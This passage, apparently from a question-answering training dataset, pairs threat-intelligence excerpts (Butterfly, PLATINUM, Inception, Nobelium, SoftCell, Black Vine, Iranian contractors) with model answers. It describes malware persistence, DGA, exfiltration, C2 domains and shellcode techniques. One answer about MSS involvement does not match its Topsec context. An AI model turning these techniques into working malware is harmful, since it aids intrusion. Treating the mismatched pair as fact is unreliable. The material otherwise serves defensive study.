vulnerability mining, software code analysis, threat intelligence, and encryption R&D, amongst other things.\nThe company served as a core technical support unit for network\nsecurity at the 2008 Olympic Games \u2013 an event which was tightly controlled by the state.  Additionally, Beijing Topsec is a known partner of the Chinese military. Since 2009, the company has possessed information publication credentials for military network procurement. Since 2013, they have been publicly recognized as the Chinese equivalent of a cleared defense contractor.\nThe links between Beijing Topsec and the Chinese government are fairly substantial, highlighted by long-standing partnerships between even the most shadowy elements of the Chinese military.\nBig Headline: The Leaked Cable\nA very compelling piece of evidence is found in the contents of a leaked 2009 diplomatic security cable from the Department of State, published by The Guardian.[56] The cable is a daily digest of Diplomatic Security alerts \u2013 essentially a situational awareness primer for State Department employees to inform them of new and existing threats.  In one section, the cable highlights that the Founder of Beijing Topsec, He Weidong, had openly talked about receiving directives from the PLA in an interview with China News Network.  In the interview, the founder quite curiously states that Topsec is less a commercial entity, but rather a research institute, and that the company received about half of its start-up capital directly from the PLA.  The cable further claims that Topsec actively recruits for the PLA cyber army.\n[57]\nIt would also appear that not only does Beijing Topsec have deep ties to state-run cyber activity, but also within the independent hacker community as well.  Of note, the company hired the notorious hacker Lin Yong, a.k.a. \"Lion\" (of the Honker Union of China[59]) in the early 2000s as a security service engineer and to conduct network training.\nBig Headline: Section Summary:\nIt is not surprising that the Chinese government would be interested in partnering with a private organization such as Beijing Topsec for use as a front for state-sponsored activity.\nThe association between Southeast University and Beijing Topsec as manifested in the joint information security research center highlights the possibility of growing links between\nstate-sponsored activity and academic institutions, particularly those that receive funding from the central government.\nAll in all, it would seem that China is pursuing a uni\u0141ed approach to cyber operations, relying on all unique facets of the workforce: academia, private industry, and independent hackers, as well as the PLA to achieve their strategic goals.\nAnswer this question: How might the involvement of the Ministry of State Security (MSS) in the Anthem hack impact the nature and objectives of the cyber operation? Why would the MSS be interested in such an attack?",
    "output": "The involvement of the MSS in the Anthem hack suggests that the operation could have been aimed at gathering sensitive information for follow-on Human Intelligence (HUMINT) targeting. This includes activities such as blackmail, asset recruitment, or technical targeting operations against individuals at home. The MSS, being China's premier human intelligence agency, would be interested in such an attack to gather valuable intelligence that can be leveraged for various strategic purposes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Conclusion\nButterfly is a skilled, persistent, and effective attack group which has been active since at least March 2012. They are well resourced, using at least one or possibly two zero-day exploits. Their motivation is very likely to be financial gain and given that they have been active for at least three years, they must be successful at monetizing their operation.\nBased on our analysis, the Butterfly attackers are likely a small team that steals data either as a service to another client or to monetize it themselves through insider trading. Symantec believes that some members of Butterfly are native English speakers, given some of the colloquialisms and Western meme references included in their infrastructure.\nThe Butterfly attackers represent a threat to organizations involved in technology, pharmaceutical, law, investment, energy and natural resources. However, over the past three years, the attackers have demonstrated that they can change their targets quickly, as they moved to include commodities in their list of targets in 2014. Clearly, the Butterfly attackers will go where the money is.\nOrganizations need to be aware of the threat that corporate espionage groups like Butterfly can pose. The attack group or their potential clients may have strong knowledge on how to leverage the stolen data to unfairly make gains in the market.\nSmall Headline: Functionality\nIf the samples are executed with no command line argument and expected registry entries are missing, an infinite loop is entered that calculates SHA-1 hashes on random data. This is likely an attempt to avoid automation engines.\nTo perform any activity, the samples need to be executed with a command line argument that begins with 'http'. This value is encrypted and stored in the registry; the registry location varies based on the sample. Each sample first encrypts the URL using RC4 with a hard-coded key. It should be noted that the hard-coded key is stored in the binary as a wide character string, but is converted to a multibyte character string before the key is used. This conversion will vary based on the region of the system executing the code.\nThe malware takes exactly one command line argument, but the single command line argument has a structure that is manually parsed by the malware. The structure of the command line argument is as follows:\nWhere \"opt\" is one of the following:\n\u2022 vm: Set to a number. \"2\" will disable vmware checks\n\u2022 proxy_username: HTTP proxy user name to use\n\u2022 proxy_password: HTTP proxy password to use\n\u2022 proxy_host: HTTP proxy host to use\n\u2022 proxy_port: HTTP proxy port to use\n\u2022 resolv: Host name to resolve to\n\u2022 delay: Number of delay loops to execute\n\u2022 sleeptime: Number of seconds to sleep at certain points in the code\n\u2022 cnx: Parameter that modifies how C&C server is interacted with\nOnce the URL from the command line is RC4-encrypted, it is encrypted a second time using the crypt32!CryptProtectData API, with \"OptionalEntropy\" set to the ASCII string 'AYBABTU' (this is the acronym for the phrase \"All your base are belong to us\"). The use of crypt32!CryptProtectData ensures that if the encrypted data is retrieved from an infected computer, it is very hard to decrypt the data on another computer. The documentation for crypt32!CryptProtectData states:\n\"Typically, only a user with the same logon credential as the user who encrypted the data can decrypt the data.\"\nNext the malware examines its execution environment. It first checks to make sure that the file name it is currently running under is the same as the original name when the executable was created. It also looks for certain process names of running processes. The process names it searches for are hashed, so we are not clear what it is looking for.\nIt checks that the hashed value of the registry subkey HKEY_LOCAL_MACHINE\\Microsoft\\WindowsNT\\ CurrentVersion\\ProductId is not equal to a number of hashed values. It checks the hashed values of the registry\nkeys in HKEY_LOCAL_MACHINE\\SOFTWARE against a list of hashes. It also checks the registry subkeysHKEY_ LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Disk\\Enum and HKEY_LOCAL_MACHINE\\HARDWARE\\ DESCRIPTION\\System\\BIOS\\SystemProductName\nVery Small Headline: 'resolv' command\nWhen the resolv command line argument is set to a domain name, a domain name system (DNS) resolution request is made for that domain name with the current computer name and calculated UID value prepended to it.\nFor example, we observed the following:\nresolv=h30026.drfx.chickenkiller.com\nWhen the sample is run with resolv set to that value, the following DNS query was observed:\nthread-2d9f4de5.1401420000c29bfea70f49b94b825e3e7586ce61350.h30026.drfx. chickenkiller.com\nIn this query, \"thread-2d9f4de5\" is the computer name and \"1401420000c29bfea70f49b94b825e3e7586ce61350\" is the calculated UID value. It is possible that the attackers use this method to exfiltrate the UID value, as the value is used in the DGA algorithm.\nVery Small Headline: UID/UPDATE_ID calculation\nThe UID is a unique ID calculated by the malware, as the following example shows:\n1401420000c29bfea70f49b94b825e3e7586ce61350\nThis ID consists of the following elements:\n\u2022 14014: Hard-coded string in the malware. May be a version number\n\u2022 2: The operating system version\n\u2022 0: 0 indicates x86, 1 indicates x86_64\n\u2022 000c29bfea70: This is the last six bytes of the UUID generated by a call to rpcrt4!UuidCreateSequential. This corresponds to the media access control (MAC) address of the infected computer.\n\u2022 f49b94b8: This is the first eight bytes of the volume serial number from a call to kernel32!GetVolumeInfomationW\n\u2022 25e3e758: This is a dword hash of the string \"[COMPUTER NAME]\\[USER NAME]\" using the current values from the computer name and user name\n\u2022 6ce61350: This is a hard-coded dword in the binary\nFor the operating system (the number at offset 5 in previous UID example), the complete table is:\n\u2022 0: Unknown/Error/Windows 8.1/Windows Server 2012 R2\n\u2022 1: Windows 2000\n\u2022 2: Windows XP\n\u2022 3: Windows 2003, Windows XP Pro x64, Windows Home Server, Windows 2003 R2\n\u2022 4: Windows Vista\n\u2022 5: Windows Server 2008\n\u2022 6: Windows 7\n\u2022 7: Windows Server 2008 R2, Windows Server 2012\n\u2022 8: Windows 8\nSmall Headline: Installation\nThe following registry subkeys may be used by Butterfly to maintain persistence:\n\u2022 HKEY_CURRENT_USER\\Software\\Adobe\\Preferences\n\u2022 HKEY_CURRENT_USER\\Software\\Adobe\\Options\n\u2022 HKEY_CURRENT_USER\\Software\\Adobe\\UID\n\u2022 HKEY_CURRENT_USER\\Software\\Acer\\UPDATE_ID\n\u2022 HKEY_CURRENT_USER\\Software\\Acer\\Preferences\n\u2022 HKEY_CURRENT_USER\\Software\\Acer\\Options\n\u2022 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Acer LiveUpdater (likely named Liveupdater.exe)\n\u2022 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Adobe Flash Plugin Updater (FlashUtil.exe)\nThe registry data stored in the \"Preferences\" and \"Options\" subkeys are REG_BINARY keys and the data within is encrypted using RC4 and crypt32!CryptProtectData, as described previously. The registry data stored in the UID is not encrypted; it is stored in plain text.\nThe value of \"Preferences\" is the encrypted version of the first command line argument used to first start the malware. For example, if the malware is launched as:\nThe value of \"Preferences\" will be:\n\"http://[DOMAIN NAME].com /opts vm=2.\"\nThe value of \"Options\" is the URL from the command line argument, so for the previous example, the value would be:\n\"http://[DOMAIN NAME].com\"\nVery Small Headline: DGA Algorithm\nThe DGA computes a URL similar to the following:\n\u2022 http://jdk.MD5([MM].[YYYY].[UID AS WIDE-CHARACTER STRING]).org\n[MM] is the current month and [YYYY] is the current year. Note that the value of [UID AS WIDE-CHARACTER STRING] is the value of the UID registry entry, but as a wide characters, so \"07.2014.140...\" would be \"0\\x007\\ x00.\\x002\\x000\\x001\\x004\\x00.\\x001\\x004\\x000\\x00...\" for the purposes of the MD5 calculation.\nFor example, on July 22, 2014 on a system with the UID set to\n\"1401420000c29bfea70f49b94b825e3e7586ce61350\", the DGA URL would be:\n\u2022 http://jdk.MD5(\\'07.2014.1401420000c29bfea70f49b94b825e3e7586ce61350\\').org\nFinally:\n\u2022 http://jdk.20e8ad99287f7fc244651237cbe8292a.org\nNote that some samples use HTTPS instead of HTTP.\nVery Small Headline: C&C commands\nThe following commands implement back door functionality.\n\u2022 cd: Changes current working directory\n\u2022 exec: Executes a file using cmd.exe\n\u2022 install: Sets the registry subkey for persistence. The registry subkey is only set if this command is sent\n\u2022 quit: Ends the back door session\n\u2022 sleeptime: Sets the sleep time between C&C queries\n\u2022 shred: Overwrites file multiple times to perform a forensic-safe delete. Only found in samples with a PE timestamp in 2014\n\u2022 sysinfo: Gathers and reports system information\n\u2022 uninstall: Uninstalls itself\n\u2022 update: Updates itself\n\u2022 url: Updates C&C URL in registry (although this feature appears to be disabled)\n\u2022 wget: Downloads file to infected computer\nVery\n\nHow does the Butterfly malware achieve persistence on an infected system? Describe the registry subkeys used and the data stored within them.",
    "output": "The Butterfly malware achieves persistence by using specific registry subkeys such as HKEY_CURRENT_USER\\\\Software\\\\Adobe\\\\Preferences, HKEY_CURRENT_USER\\\\Software\\\\Acer\\\\UPDATE_ID, and others. The 'Preferences' and 'Options' subkeys store encrypted data using RC4 and crypt32!CryptProtectData. The 'Preferences' value stores the encrypted version of the first command line argument used to start the malware, while the 'Options' value stores the URL from the command line argument. The UID is stored in plain text in the 'UID' subkey.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: AMT Serial-over-LAN (SOL) communication channel\nActive Management Technology (AMT) enables remote management of devices and is provided as a feature of Intel\u00ae vPro\u2122 processors and chipsets. AMT runs in the Intel Management Engine (ME), which runs its own operating system to execute on an embedded processor located in the chipset (Platform Controller Hub, PCH). As this embedded processor is separate from the primary Intel processor, it can execute even when the main processor is powered off and is therefore able to provide out-of-band (OOB) remote administration capabilities such as remote power-cycling and keyboard, video, and mouse control (KVM).\nAMT has a Serial-over-LAN (SOL) feature that exposes a virtual serial device with a chipset-provided channel over\nTCP.\nThis functionality works independently of the device host operating system networking stack\u2014the ME makes use of its own networking stack and has access to the hardware network interface. This means that even if networking is disabled on the host, SOL will still function as long as the device is physically connected to the network.\nFurthermore, as the SOL traffic bypasses the host networking stack, it cannot be blocked by firewall applications running on the host device. To enable SOL functionality, the device AMT must be provisioned. Also, establishment of a SOL session requires a username and password\u2014usually selected during device provisioning. The tool would therefore require the relevant credentials to establish such a session.\nOne possibility is that PLATINUM might have obtained compromised credentials from victim networks. Another possibility is that the targeted systems did not have AMT provisioned and PLATINUM, once they've obtained\nadministrative privileges on the system, proceeded to provision AMT.\nThere are several methods for provisioning AMT. The most straightforward is host-based provisioning (HBP), which can be done from within the host Windows OS itself and requires administrator permissions. During the provisioning process, PLATINUM could select whichever username and password they wish. HBP enables access to a subset of AMT functionality, which includes SOL but restricts access to other features such as KVM redirect.\nBig Headline: How PLATINUM uses SOL\nIn the first version of the file-transfer tool, which we described in the (<http://download.microsoft.com/download/2/2/5/225BFE3E-E1DE-4F5B-A77B-71200928D209/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf>)original paper, network communication is done over TCP/IP by utilizing the regular network APIs. The presentation layer protocol is straightforward: the buffer is made up of a two-byte header\u2014the indication length\u2014and the Blowfish-encrypted payload data itself.\nThe new SOL protocol within the PLATINUM file-transfer tool makes use of the AMT Technology SDK's Redirection Library API (imrsdk.dll). Data transactions are performed by the calls IMR_SOLSendText()/IMR_SOLReceiveText(), which are analogous to networking send() and recv() calls. The SOL protocol used is identical to the TCP protocol other than the addition of a variable-length header on the data for error detection. Also, the updated client sends an unencrypted packet with the content \"007\u2033 before authentication.\nThe new header has various fields to detect possible data corruption errors, including a CRC-16 and a binary index of the bytes having the set of most significant bits (MSB).\nThe following video demonstrates how the PLATINUM tool can be used to transfer malware to a computer with AMT provisioned:\nBig Headline: Detecting unusual binaries that use AMT\nIf an attacker who has access to AMT credentials attempts to use the SOL communication channel on a computer running (<http://aka.ms/wdatp>)Windows Defender ATP , behavior analytics coupled with machine learning can detect the targeted attack activity. Windows Defender ATP displays an alert similar to the one shown below. Windows Defender ATP can differentiate between legitimate usage of AMT SOL and targeted attacks attempting to use it as a communication channel.\nThe PLATINUM tool is, to our knowledge, the first malware sample observed to misuse chipset features in this way. While the technique used here by PLATINUM is OS independent, Windows Defender ATP can detect and notify network administrators of attempts to leverage the AMT SOL communication channel for unauthorized activity, specifically when used against a computer running Windows.\nAt Microsoft, we continuously monitor the threat landscape for novel techniques used for malicious purposes. We also constantly build mechanisms that mitigate resulting risks and protect customers. The discovery of this new PLATINUM technique and the development of detection capabilities highlight the work the Windows Defender ATP team does to provide customers greater visibility into suspicious activities transpiring on their networks.\nMicrosoft reiterates that the PLATINUM tool does not expose flaws in Intel\u00ae Active Management Technology (AMT), but uses the technology within an already compromised network to evade security monitoring tools.\n\nQ: How can Windows Defender ATP detect and differentiate between legitimate and malicious use of the AMT SOL communication channel, particularly in the context of PLATINUM's activities?",
    "output": "A: Windows Defender ATP employs behavior analytics coupled with machine learning to detect targeted attack activity when an attacker attempts to use the AMT SOL communication channel. It can differentiate between legitimate usage of AMT SOL and targeted attacks by analyzing the behavior patterns and context of the communication. When a malicious attempt is detected, Windows Defender ATP displays an alert to notify network administrators. This capability allows Windows Defender ATP to provide greater visibility into suspicious activities on the network, specifically when the AMT SOL communication channel is used for unauthorized activity against a computer running Windows.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Functionality of function 00120F82 ( GetProcAddress)\nAs shown in the next screenshot, this function parses the \"export name pointer table\" of the .dll [ex. kernel32.dll] and generates a hash for each function. It compares this with the argument API hash (Ex DF7D9BAD for GetFileSize, see above screenshot) using the CMP EDI, ESI instruction. Once the matching API is found it parses the Export Address Table and returns the respective API address to the caller in EAX register.\nThe document contains two levels of shellcode. We are analyzing first level, and in the following code we can see a typical egghunting method: It attempts to open the already opened rtf file by checking file handles in memory. It starts with a handle with the value 4 and verifies it by doing GetFileSize on it. If this fails it does ADD ESI,4 again (adds 4 to the handle) until the API succeeds. When this happens it checks the file offset 0x8300 for the marker 0x54405450. Again, if this matches up, it allocates memory into which it reads the file content and jumps to the 2nd level shellcode with a JMP EBX.\nBig Headline: Second Level Shell Code Analysis\nNow we have landed into the second level shellcode, but it is obfuscated to evade static analysis. At the initial stage there are few instructions waiting to help us. This is the deobfuscation code. We can see that 0x23B * 4 is the number of bytes obfuscated, POP EBX is the get EIP instruction and 0x5687F945 is the deobfuscation XOR key.\nIn following code we can see the hexadecimal value that corresponds to the library name being pushed to the LoadLibrary function, as well as two loops to get the API addresses using \"CALL 02E203E2\" function. Here also it uses hashes to look up APIs.\nIn the following code it searches for the embedded VBS file inside the RTF file in memory. It checks for the file size in a loop, and if the size is larger than 0x2000 then it sets the file ponter to 0x8C14 to compare with the VBS file marker as we can see in following screenshot.\nAfter finding the VBS marker in memory, it decrypts the VBS file in two iterations. In the first loop it decrypts and in the second loop it swaps the low and high bytes of the first 0x100 16-bit words, after which it writes the file to a file named \"Temp/ew_Rg.vbs\".\nBig Headline: Payload .VBS file Analysis\nThe following screenshot shows a part of the .VBS payload file dropped by .RTF file. First line is the encrypted .dll 4th line contains Key to decrypt the .dll. Remaining part is self-explanatory.\nThe instruction c = Crypt(c,k) function decrypts the encrypted dll and returns the decrypted dll. (See the screenshot above)\nc= encrypted dll.\nk = decryption key.\nFollowing function writes byte by byte to the dropped.dll file.\nFinally, the following code executes the \"regsvr32\" command to run the wmiprvse.dll in silent mode and sets the run key in registry.\nBig Headline: Payload \"wmiprvse.dll\" file Analysis\nThis first level of deobfuscation in wmiprvse.dll takes around 3-4 minutes to finish. Then it allocates memory using VirtualAlloc and writes the unpacked code to newly allocated memory before it jumps to the unpacked code as shown in following screen shot.\nThis dll has 3 layers of unpacking. The one above is level one, below iyou can see level two. We can see the passing of the control to the newly unpacked .dll @CALL EAX.\nIt's very time-consuming to understand the functionality of the dll as it decrypts and builds its own runtime import table to hinder the analysis. Analyst cannot directly see which API gets called.\nFinally we can see it's connecting to (<http://webdev.cloudme.com/>)webdav.cloudme.com and cleartext credentials in following screenshot.\nMalware tries to communicate with the user account created at the WebDAV C&C to exfiltrate system and user information.\nReference:\nQ: Explain the method used by the Inception APT's shellcode to locate and execute the second level shellcode within an already opened RTF file. What techniques are employed to verify the file handle and identify the embedded shellcode?",
    "output": "The Inception APT's shellcode employs a typical egghunting method to locate and execute the second level shellcode within an already opened RTF file. It starts by attempting to open the RTF file by checking file handles in memory, beginning with a handle value of 4. It verifies the handle by performing a GetFileSize operation. If this fails, it increments the handle value by 4 (using ADD ESI, 4) and repeats the process until the API call succeeds. Upon success, it checks the file offset 0x8300 for the marker 0x54405450. If this marker matches, the shellcode allocates memory, reads the file content into this memory, and then jumps to the second level shellcode using a JMP EBX instruction.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nWatch our CEO Lior Div's keynote on the operation.\nIn 2018, reported sensitive customer information was stolen due to an attack. These telecommunications providers have been expanding in size, to the point where In the past thirteen years, mobile cellular phone subscribers have . Due to their wide availability and the fundamental service they bring, telecommunications providers have become critical infrastructure for the majority of world powers.\nMuch like telecommunication providers, many other critical infrastructure organizations provide a , due to their high impact. In studies, had been hit by nation state attacks and 60% said disruptive cyber attacks are among the threats they are most worried about.\nThreat actors, especially those at the level of nation state, are seeking opportunities to attack these organizations, conducting elaborate, advanced operations to , . When successful, these attacks often have huge implications.\nLast year, we identified a threat actor that has been operating in telecommunications provider environments for at least two years. We performed a of the attacks and were able to identify changes in the attack patterns along with new activity every quarter.\nThe threat actor mainly sought to obtain CDR data (call logs, cell tower locations, etc.) belonging to specific individuals from various countries. This type of targeted cyber espionage is usually the work of nation state threat actors.\nWe've concluded with a high level of certainty that the threat actor is affiliated with China and is likely state sponsored. The tools and techniques used throughout these attacks are (<https://www.justice.gov/opa/pr/two-chinese-hackers-associated-ministry-state-security-charged-global-computer-intrusion>)consistent with several Chinese threat actors, such as , a threat actor believed .\nThe threat actor changed activity every quarter.\nThe attack began with a web shell running on a vulnerable, publicly-facing server, from which the attackers gathered information about the network and propagated across the network. The threat actor attempted to compromise critical assets, such as database servers, billing servers, and the active directory. As malicious activity was detected and remediated against, the threat actor stopped the attack.\nThe second wave of the attack hit several months later with similar infiltration attempts, along with a modified version of the web shell and reconnaissance activities. A game of cat and mouse between the threat actor and the defenders began, as they ceased and resumed their attack 2 more times in the span of a 4 month period.\nRead the text above and answer this question: How did the threat actor in Operation SoftCell adapt their tactics over time, and what does this tell us about their capabilities and the challenges faced by defenders? Describe the evolution of their attack patterns and the countermeasures taken by the defenders.",
    "output": "The threat actor in Operation SoftCell adapted their tactics over time by changing their activity every quarter. The initial attack began with a web shell running on a vulnerable, publicly-facing server, from which the attackers gathered information about the network and propagated across it, attempting to compromise critical assets such as database servers, billing servers, and the active directory. As malicious activity was detected and remediated against, the threat actor stopped the attack. The second wave of the attack hit several months later with similar infiltration attempts but included a modified version of the web shell and reconnaissance activities. This adaptation indicates the threat actor's capability to evolve and persist despite defensive measures. The defenders engaged in a game of cat and mouse, detecting and remediating the attacks, causing the threat actor to cease and resume their efforts multiple times over a four-month period. This dynamic highlights the ongoing challenge faced by defenders in continuously adapting to sophisticated and persistent adversaries.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Affected Platforms: Windows\nImpacted Users: Windows users associated with the targeted embassies Impact: Compromised machines are under the control of the threat actor Severity Level: Medium\nNobelium, also known as APT29 and Cozy Bear, is a highly sophisticated group of Russian-sponsored cybercriminals. Approximately two years ago, countless system administrators and IT teams were forced to work around the clock to address Nobelium's attack on SolarWinds. And last year, they similarly targeted numerous IT supply chains in the hopes of being able to embed themselves once again deep inside IT networks. But fast forward to today, and the Nobelium group seems to have shifted their focus. This time, rather than targeting software solutions, they have begun targeting embassies. While these attacks may not impact the average Windows computer user, they do have potentially larger political ramifications.\nFortiGuard Labs has uncovered evidence that the Nobelium group is impersonating someone associated with the Turkish embassy in targeted email-based attacks. We will be analyzing one such attack that uses Omicron/Covid-19 as a lure. Those working in or around embassies are urged to be extra diligent when opening emails.\nIn this blog, we will highlight techniques and code reuse by Nobelium. We will also highlight the usage of JARM, which is a widely used technology created by Salesforce to fingerprint and track malicious servers.\nThe source email address seems to be a legitimate, albeit compromised email account of a government department focused on social affairs. In tracing this, however, this email comes from a French-speaking country in Africa. It is disguised as coming from a Turkish embassy and sent to a Portuguese-speaking nation, although it is written in English.\nThe email itself comes with a .HTML file attachment. This file contains malicious JavaScript designed to create an .ISO file on the user's computer. Figure 2 shows some similarities between a previous Nobelium attack and this current version.\nFigure 2: Malicious Javascript\nThe original (<https://attack.mitre.org/techniques/T1027/006/>)HTML Smuggling attack conducted by Nobelium used EnvyScout to convert a text blob into an .ISO file. EnvyScout is one of the toolsets used as a dropper in spearphishing attacks by this APT group. As seen in Figure 2, both samples used an application type of \"x-cd-image.\" This part of the attack has changed very little. However, Figure 3 below shows the function used to create the .ISO file has been streamlined from previous iterations.\nFigure 3: ISO creation\nOnce the .ISO file has been created on the user's machine, the attack requires a user to open the file. By default, opening an .ISO file on modern versions of Windows causes it to mount the file on the next available drive letter. Once mounted, the files can be seen. Figure 4 below shows this part of the attack chain.\nFigure 4: Mounted ISO files\nOne of the previous variants of the Nobelium attack was dated almost exactly one year prior to the current attack. Both versions contain malicious shortcuts that point to a DLL file. In the current version, the DLL file inside the bin folder is named \"DeleteDateConnectionPosition.dll.\"\nIn the past, one of the payloads used was a Cobalt Strike beacon, and this is the case in this current version. Given the current political situation, it is clearly in Russia's best interest to know what other governments are thinking, planning, and doing, and successful installation of a Cobalt Strike beacon provides a foothold into the embassies they are interested in monitoring. To achieve this objective, the shortcut launches the DLL using an export named \"DeleteDateConnectionPosition.\"\nFigure 5: DLL Exports\nMany of the exports inside the DLL contain junk code. As such, debugging the malware is faster than statically analyzing it. Once completed we discovered a C2 server, as shown below.\nFigure 6: Debugging the malicious DLL\nAccording to our sources, this server is not a shared server and the IP address only contains the sinitude[.]com domain.\n\nAnswer this question based on the above context: How does the Nobelium group leverage HTML Smuggling and EnvyScout in their latest attack on embassies? Why is this technique effective and how can cybersecurity experts detect and mitigate such attacks?",
    "output": "The Nobelium group leverages HTML Smuggling and EnvyScout by embedding malicious JavaScript within an HTML file attachment in phishing emails. This JavaScript creates an .ISO file on the user's computer, which, when opened, mounts on the next available drive letter and executes malicious content. This technique is effective because it bypasses traditional email filters and antivirus software that may not scan .HTML files thoroughly. Cybersecurity experts can detect these attacks by monitoring for unusual email attachments and using advanced threat detection tools that analyze JavaScript behavior. Mitigation strategies include user education on phishing awareness, implementing strict email filtering rules, and using endpoint protection solutions that can detect and block the execution of malicious scripts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Relationship Between the Iranian Government, Contractors, and Security Forums\n, , , and  have all performed significant research on Iranian nation-state-sponsored campaigns that provide historical insight into technical capabilities and relationships between the Iranian government and contractors.\nThe work of the aforementioned security companies and recent  provides consistent evidence that Iranian government-sponsored offensive campaigns are executed by contractors.\ndisclosed that the Nasr Institute was an APT 33 contractor in an operation that used publicly available backdoors and remote access trojans. The handle \"xman_1365_x\" (self-identified on security forums as Mahdi Honarvar) was found by FireEye in malware artifacts, which  linked to the Nasr Institute. Previously, Nasr Institute had been  with Operation Ababil's distributed denial-of-service attacks against American banks, an organization which a U.S. Department of Justice  confirms had been hired to build attack infrastructure by the Iranian government.\nThe actor xman_1365_x was then  to a security company called Kavosh Security via OSINT by Iran Cyber News Agency. The actor was linked to a destructive operation, which used NewsBeef and StoneDrill malware families. According to , the latter data wiping operation targeted sectors across Saudi Arabia and Europe.\nCommand and control (C2) domains used by StoneDrill and NewsBeef in Kaspersky's findings were found to share an SSL certificate, which surfaced an additional three domains in  by the Iran Cyber News Agency. WHOIS information was then connected via open sources to Imam Hossein University (IHU). IHU was named in sanctions  \"for providing, or attempting to provide technological, or other support for and services in support of the IRGC.\"\nAdditional publicly known Iranian contractors include , also linked to Operation Ababil.\nThe links between the Iranian government and contractors are well documented; however, the identity of specific groups and individuals within the Iranian government and IRGC responsible for offensive cyber campaigns is murky, as is the relationship between contractors and security forums.\nYet, our research and analysis suggest that Iranian security forums may play a role in staffing and knowledge sharing for Iranian contractors. First, FireEye referenced the publicly available ALFA TEaM Shell in . The ALFA Shell is discussed in multiple web locations, including Ashiyane and Iranian Dark Coders Team Forum.\nALFA TEaM shell history.\nSecond, xman_1365_x created an  on August 8, 2010, allegedly not long after Ashiyane temporarily became the primary security forum in Iran, following Behrooz Kamalian's visit to prominent cleric, Ayatollah Naser Makarem Shirazi.\nxman_1365_x created an Ashiyane profile in 2010.\nFinally, according to Insikt Group's source, Iranian contractor ITSEC specifically employed hackers from the respective online forums Simorgh and Delta Security. Further, , managed the Simorgh forum and worked with his father, who was employed by the IRGC.\nSource:\nZone-h captured website defacements committed by Hossein Asgari\nSource:\nAccording to Insikt Group's source, to find and retain the best offensive cyber talent, Iranian government contractors are forced to mine closed-trust communities. The links between the forums and contractors may illustrate that the trust communities begin with the Iranian security forums.\nQ: What is the significance of the ALFA TEaM Shell in the context of Iranian cyber operations, and how does it relate to security forums like Ashiyane?",
    "output": "The ALFA TEaM Shell is a publicly available tool that has been discussed in various web locations, including Iranian security forums like Ashiyane and Iranian Dark Coders Team Forum. Its significance lies in its use by Iranian cyber actors, as referenced by FireEye. The discussion of this shell in these forums indicates that they serve as platforms for sharing knowledge and tools among Iranian cyber operatives. The presence of such discussions suggests that these forums play a role in the broader ecosystem of Iranian cyber operations, facilitating the exchange of information and potentially aiding in the recruitment of skilled individuals for government-sponsored activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Key findings\nAfter researching Black Vine's attacks over time, Symantec identified the following key findings:\n\u2022 Black Vine is responsible for carrying out cyberespionage campaigns against multiple industries, including energy, aerospace, and healthcare.\n\u2022 Black Vine conducts watering-hole attacks targeting legitimate energy- and aerospace-related websites to compromise the sites' visitors with custom malware.\n\u2022 Black Vine appears to have access to the , which is used to distribute zero-day exploits among threat groups that specialize in cyberespionage.\n\u2022 Black Vine uses custom-developed malware and has resources to frequently update and modify its malware to avoid detection.\nThe findings documented in this report lead Symantec to believe that Black Vine is an attack group with working relationships with multiple cyberespionage actors. The group is well funded, organized, and comprises of at least a few members, some of which may have a past or present association with a  China-based IT security organization called Topsec.\nBig Headline: Targets\nOver the course of the Black Vine investigation, Symantec identified a number of targeted companies across several verticals. Analysis of attack data alone is misleading, due to Black Vine's attack vectors. Black Vine frequently conducts watering-hole attacks, which is when a legitimate website is compromised by an attacker and forced to serve malware to visitors of the website. As a result, an analysis of compromised computers alone does not portray an accurate picture of Black Vine's targeting objectives.  Instead, this shows us the industries with the highest infection rates of Black Vine's malware.\nBased on an analysis of Symantec's telemetry data, the following industries have been affected by Black Vine's activity:\n\u2022 Aerospace\n\u2022 Healthcare\n\u2022 Energy (specifically, gas and electric turbine manufacturers)\n\u2022 Military and defense\n\u2022 Finance\n\u2022 Agriculture\n\u2022 Technology\nFigure 1. Black Vine victims by region\nTo further determine Black Vine's intended target industries, Symantec assessed the companies who own the affected websites. Symantec also investigated attacks believed to have been conducted by Black Vine which didn't involve watering-hole attacks. After assessing multiple attack verticals, Symantec believes that Black Vine's primary targeted industries have been aerospace and healthcare. It is likely that other industries that were affected by these attacks may have been secondary targets.\nBlack Vine's targets are spread across several regions, based on the IP address locations of the compromised computers. The vast majority of infections affected companies in the US, followed by China, Canada, Italy, Denmark, and India.\nBig Headline: Attackers' resources\nBlack Vine appears to have access to a wide variety of resources to let it conduct multiple simultaneous attacks over a sustained period of time. These resources include the development of custom malware, access to zero-day exploits, and attacker-owned infrastructure. Funding and resourcing for sustained cyberespionage campaigns against such a breadth targets can only be obtained through large public entities or privately owned organizations.\nOur analysis showed three major variants of Black Vine's custom malware used in activity that we attribute to the attack group. The three variants of custom-developed malware are known as Hurix and Sakurel (both detected as ), and Mivast (). These variants are believed to have been created by the same malware author(s) and use some of the same code and resources. For example, Hurix and Sakurel have the following similarities:\n\u2022 Both Hurix and Sakurel gather the computer name of the target and encrypt data using the same algorithm.\n\u2022 This algorithm uses division and addition with static variables 1Ah and 61h. The location of the algorithm in each threat is as follows:\no Hurix: 402A75h\no Sakurel: 1000147Bh\n\u2022 Similar data and parameters exist in the network communication parameters:\no Both variants use the parameter \"type\" which is initialized with zero value.\no Both variants use a parameter that contains the same data, as seen below:\n\uf0a7 Hurix: cookie=iztkctcebtgbbyf-2135928347 (where \"cookie\" is the parameter, \"iztkctcebtgbbyf\" is the encrypted computer name, and \"-2135928347\" is the decimal equivalent of the hard disk serial number)\n\uf0a7 Sakurel: 